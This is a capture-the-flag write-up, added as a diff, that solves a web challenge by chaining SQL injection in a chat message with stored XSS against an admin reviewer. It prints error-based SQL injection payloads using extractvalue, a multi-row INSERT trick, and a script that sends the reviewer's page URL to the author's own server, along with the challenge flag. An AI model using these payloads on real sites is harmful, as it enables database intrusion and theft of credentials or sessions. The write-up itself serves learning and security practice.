@@ -1,0 +1,85 @@
+Score: 325
+Type: web
+
+http://146.148.60.107:9991/
+
+
+Solved by 64 teams
+--------------------------------------
+
+When we go to the linked website, we see the following message:
+Notice: All messages will be logged, and Big Boss will review your messages for anti-terrorism.
+
+The first thing that comes to mind when you see "will review your messages" should be XSS.
+
+After trying some basic things, I would get a lot of "Message Rejected", so there is obviously some filtering going on.
+
+Because websockets are used, it's not possible to use a proxy like Burp Suite to intercept the traffic. I opted to use Python instead. (see client.py)
+Now, we should see what characters are allowed, for both the nickname and the message (see below).
+
+The characters for the nickname are very limited, but when I executed the second part (to find the characters for the message), I was surprised to see an SQL error come back. We are still limited by the characters, but we can use SQL fuctions, so that's good.
+After messing around a bit, doing some basic recon (see nblow), it became clear that the user didn't have SELECT-permissions for the database. This confirmed my initial suspicions that I would need XSS.
+
+So, if we can't SELECT, we'll just have to INSERT instead; INSERT a message with XSS, that will steal the flag for us.
+
+I thought the query might look something like this:
+insert into messages (msg) values ('$message')
+
+At first, I tried to work with the 2 surrounding single quotes, but that didn't work. Then I discovered the solution: INSERT multiple records with 1 query.
+
+If $message =  b'), ('c'), ('d
+Then we will input 3 records without having to deal with the quotes.
+
+We are now free to replace 'c' (with quotes) by a function. I used char(i1, i2, ...) to be able to print anything I wanted (including the blacklisted "<" and ">"). (See client.py)
+
+Before we send the XSS, we need a way to capture the server's response. I used php's built-in webserver and a basic HelloWorld page (see phpdir/).
+Execute this to set it up (and don't forget to forward the port on your router):
+php -S <mylocalip>:9999 -t phpdir/
+
+This is the XSS I sent:
+<script>window.location="http://<myip>:9999?cookie="+document.URL</script>
+(Note: I tried document.cookie and document.flag first.)
+
+The server sent me this:
+http://127.0.0.1:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&id=42334
+
+If we look closely at the pass parameter, we can see it's base64 encoded. Decode it, and you get the flag.
+
+FLAG = BCTF{xss_is_not_that_difficult_right}
+--------------------------------------
+
+ALLOWED CHARS
+
+Nick characters:
+[48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122]
+0123456789
+abcdefghijklmnopqrstuvwxyz
+
+Msg characters:
+[10, 32, 39, 40, 41, 43, 44, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 
+\x10
+\x32
+'
+(
+)
++
+,
+.
+0123456789
+;
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+abcdefghijklmnopqrstuvwxyz
+
+-------------------------------------
+
+DATABASE RECON/ENUMERATION:
+
+eDatabase error: SELECT command denied to user 'chatserv'@'localhost' for table 'user'
+==> user chatserv
+
+send("a", "b' or extractvalue(1,concat(0x7e, (SELECT database()) )) or 'c", ws)
+==> database chatserv
+
+
+send("a", "b' or extractvalue(1,concat(0x7e, ( version() ) )) or 'c", ws)
+==> version 10.0.17-MariaDB-log
